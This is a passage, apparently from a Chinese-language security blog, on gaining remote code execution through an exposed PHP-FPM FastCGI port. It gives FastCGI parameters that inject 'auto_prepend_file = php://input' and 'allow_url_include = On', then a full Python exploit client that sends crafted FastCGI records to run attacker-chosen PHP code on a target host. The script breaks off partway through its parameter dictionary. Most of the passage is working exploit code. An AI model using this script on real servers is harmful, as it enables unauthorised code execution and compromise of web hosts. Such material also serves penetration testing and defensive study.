&#x27;php/fcgiclient&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class=\"line\">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class=\"line\">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br><span class=\"line\">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>设置 <code>auto_prepend_file = php://input</code>  且 <code>allow_url_include = On</code> ，然后将我们需要执行的代码放在 Body 中，即可执行任意代码。</p>\n<p>利用脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> BytesIO</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class=\"line\"></span><br><span class=\"line\">PY2 = <span class=\"literal\">True</span> <span class=\"keyword\">if</span> sys.version_info.major == <span class=\"number\">2</span> <span class=\"keyword\">else</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bchr</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> PY2:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> force_bytes(<span class=\"built_in\">chr</span>(i))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">bytes</span>([i])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bord</span>(<span class=\"params\">c</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(c, <span class=\"built_in\">int</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> c</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">ord</span>(c)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">force_bytes</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(s, <span class=\"built_in\">bytes</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>, <span class=\"string\">&#x27;strict&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">force_text</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">issubclass</span>(<span class=\"built_in\">type</span>(s), <span class=\"built_in\">str</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(s, <span class=\"built_in\">bytes</span>):</span><br><span class=\"line\">        s = <span class=\"built_in\">str</span>(s, <span class=\"string\">&#x27;utf-8&#x27;</span>, <span class=\"string\">&#x27;strict&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        s = <span class=\"built_in\">str</span>(s)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FastCGIClient</span>:</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># private</span></span><br><span class=\"line\">    __FCGI_VERSION = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    __FCGI_ROLE_RESPONDER = <span class=\"number\">1</span></span><br><span class=\"line\">    __FCGI_ROLE_AUTHORIZER = <span class=\"number\">2</span></span><br><span class=\"line\">    __FCGI_ROLE_FILTER = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">    __FCGI_TYPE_BEGIN = <span class=\"number\">1</span></span><br><span class=\"line\">    __FCGI_TYPE_ABORT = <span class=\"number\">2</span></span><br><span class=\"line\">    __FCGI_TYPE_END = <span class=\"number\">3</span></span><br><span class=\"line\">    __FCGI_TYPE_PARAMS = <span class=\"number\">4</span></span><br><span class=\"line\">    __FCGI_TYPE_STDIN = <span class=\"number\">5</span></span><br><span class=\"line\">    __FCGI_TYPE_STDOUT = <span class=\"number\">6</span></span><br><span class=\"line\">    __FCGI_TYPE_STDERR = <span class=\"number\">7</span></span><br><span class=\"line\">    __FCGI_TYPE_DATA = <span class=\"number\">8</span></span><br><span class=\"line\">    __FCGI_TYPE_GETVALUES = <span class=\"number\">9</span></span><br><span class=\"line\">    __FCGI_TYPE_GETVALUES_RESULT = <span class=\"number\">10</span></span><br><span class=\"line\">    __FCGI_TYPE_UNKOWNTYPE = <span class=\"number\">11</span></span><br><span class=\"line\"></span><br><span class=\"line\">    __FCGI_HEADER_SIZE = <span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># request state</span></span><br><span class=\"line\">    FCGI_STATE_SEND = <span class=\"number\">1</span></span><br><span class=\"line\">    FCGI_STATE_ERROR = <span class=\"number\">2</span></span><br><span class=\"line\">    FCGI_STATE_SUCCESS = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, host, port, timeout, keepalive</span>):</span><br><span class=\"line\">        self.host = host</span><br><span class=\"line\">        self.port = port</span><br><span class=\"line\">        self.timeout = timeout</span><br><span class=\"line\">        <span class=\"keyword\">if</span> keepalive:</span><br><span class=\"line\">            self.keepalive = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.keepalive = <span class=\"number\">0</span></span><br><span class=\"line\">        self.sock = <span class=\"literal\">None</span></span><br><span class=\"line\">        self.requests = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__connect</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        self.sock.settimeout(self.timeout)</span><br><span class=\"line\">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># if self.keepalive:</span></span><br><span class=\"line\">        <span class=\"comment\">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class=\"line\">        <span class=\"comment\"># else:</span></span><br><span class=\"line\">        <span class=\"comment\">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            self.sock.connect((self.host, <span class=\"built_in\">int</span>(self.port)))</span><br><span class=\"line\">        <span class=\"keyword\">except</span> socket.error <span class=\"keyword\">as</span> msg:</span><br><span class=\"line\">            self.sock.close()</span><br><span class=\"line\">            self.sock = <span class=\"literal\">None</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">repr</span>(msg))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__encodeFastCGIRecord</span>(<span class=\"params\">self, fcgi_type, content, requestid</span>):</span><br><span class=\"line\">        length = <span class=\"built_in\">len</span>(content)</span><br><span class=\"line\">        buf = bchr(FastCGIClient.__FCGI_VERSION) \\</span><br><span class=\"line\">              + bchr(fcgi_type) \\</span><br><span class=\"line\">              + bchr((requestid &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr(requestid &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr((length &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr(length &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">              + bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">              + content</span><br><span class=\"line\">        <span class=\"keyword\">return</span> buf</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__encodeNameValueParams</span>(<span class=\"params\">self, name, value</span>):</span><br><span class=\"line\">        nLen = <span class=\"built_in\">len</span>(name)</span><br><span class=\"line\">        vLen = <span class=\"built_in\">len</span>(value)</span><br><span class=\"line\">        record = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> nLen &lt; <span class=\"number\">128</span>:</span><br><span class=\"line\">            record += bchr(nLen)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record += bchr((nLen &gt;&gt; <span class=\"number\">24</span>) | <span class=\"number\">0x80</span>) \\</span><br><span class=\"line\">                      + bchr((nLen &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr((nLen &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr(nLen &amp; <span class=\"number\">0xFF</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> vLen &lt; <span class=\"number\">128</span>:</span><br><span class=\"line\">            record += bchr(vLen)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record += bchr((vLen &gt;&gt; <span class=\"number\">24</span>) | <span class=\"number\">0x80</span>) \\</span><br><span class=\"line\">                      + bchr((vLen &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr((vLen &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr(vLen &amp; <span class=\"number\">0xFF</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> record + name + value</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__decodeFastCGIHeader</span>(<span class=\"params\">self, stream</span>):</span><br><span class=\"line\">        header = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;version&#x27;</span>] = bord(stream[<span class=\"number\">0</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;type&#x27;</span>] = bord(stream[<span class=\"number\">1</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;requestId&#x27;</span>] = (bord(stream[<span class=\"number\">2</span>]) &lt;&lt; <span class=\"number\">8</span>) + bord(stream[<span class=\"number\">3</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class=\"number\">4</span>]) &lt;&lt; <span class=\"number\">8</span>) + bord(stream[<span class=\"number\">5</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class=\"number\">6</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;reserved&#x27;</span>] = bord(stream[<span class=\"number\">7</span>])</span><br><span class=\"line\">        <span class=\"keyword\">return</span> header</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__decodeFastCGIRecord</span>(<span class=\"params\">self, buffer</span>):</span><br><span class=\"line\">        header = buffer.read(<span class=\"built_in\">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> header:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record = self.__decodeFastCGIHeader(header)</span><br><span class=\"line\">            record[<span class=\"string\">&#x27;content&#x27;</span>] = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;contentLength&#x27;</span> <span class=\"keyword\">in</span> record.keys():</span><br><span class=\"line\">                contentLength = <span class=\"built_in\">int</span>(record[<span class=\"string\">&#x27;contentLength&#x27;</span>])</span><br><span class=\"line\">                record[<span class=\"string\">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;paddingLength&#x27;</span> <span class=\"keyword\">in</span> record.keys():</span><br><span class=\"line\">                skiped = buffer.read(<span class=\"built_in\">int</span>(record[<span class=\"string\">&#x27;paddingLength&#x27;</span>]))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> record</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">request</span>(<span class=\"params\">self, nameValuePairs=&#123;&#125;, post=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> self.__connect():</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">        requestId = random.randint(<span class=\"number\">1</span>, (<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">16</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        self.requests[requestId] = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\">        request = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">        beginFCGIRecordContent = bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\</span><br><span class=\"line\">                                 + bchr(self.keepalive) \\</span><br><span class=\"line\">                                 + bchr(<span class=\"number\">0</span>) * <span class=\"number\">5</span></span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class=\"line\">                                              beginFCGIRecordContent, requestId)</span><br><span class=\"line\">        paramsRecord = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> nameValuePairs:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (name, value) <span class=\"keyword\">in</span> nameValuePairs.items():</span><br><span class=\"line\">                name = force_bytes(name)</span><br><span class=\"line\">                value = force_bytes(value)</span><br><span class=\"line\">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> paramsRecord:</span><br><span class=\"line\">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class=\"string\">b&#x27;&#x27;</span>, requestId)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> post:</span><br><span class=\"line\">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class=\"string\">b&#x27;&#x27;</span>, requestId)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.sock.send(request)</span><br><span class=\"line\">        self.requests[requestId][<span class=\"string\">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class=\"line\">        self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>] = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.__waitForResponse(requestId)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__waitForResponse</span>(<span class=\"params\">self, requestId</span>):</span><br><span class=\"line\">        data = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            buf = self.sock.recv(<span class=\"number\">512</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">len</span>(buf):</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            data += buf</span><br><span class=\"line\"></span><br><span class=\"line\">        data = BytesIO(data)</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            response = self.__decodeFastCGIRecord(data)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> response:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \\</span><br><span class=\"line\">                    <span class=\"keyword\">or</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class=\"line\">                    self.requests[<span class=\"string\">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class=\"line\">                <span class=\"keyword\">if</span> requestId == <span class=\"built_in\">int</span>(response[<span class=\"string\">&#x27;requestId&#x27;</span>]):</span><br><span class=\"line\">                    self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>] += response[<span class=\"string\">&#x27;content&#x27;</span>]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class=\"line\">                self.requests[requestId]</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__repr__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(self.host, self.port)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;host&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;file&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;-c&#x27;</span>, <span class=\"string\">&#x27;--code&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;What php code your want to execute&#x27;</span>, default=<span class=\"string\">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;-p&#x27;</span>, <span class=\"string\">&#x27;--port&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;FastCGI port&#x27;</span>, default=<span class=\"number\">9000</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    client = FastCGIClient(args.host, args.port, <span class=\"number\">3</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    params = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\">    documentRoot = <span class=\"string\">&quot;/&quot;</span></span><br><span class=\"line\">    uri = args.file</span><br><span class=\"line\">    content = args.code</span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class=\"string\">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REQUEST_METHOD&#x27;</span>: <span class=\"string\">&#x27;POST&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class=\"string\">&#x27;/&#x27;</span>),</span><br><span class=\"line\">        <span class=\"string\">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class=\"line\">        <span class=\"string\">&#x27;QUERY_STRING&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class=\"line\">        <span class=\"string\">&#x27;DOCUMENT_ROOT&#x27;</span>: 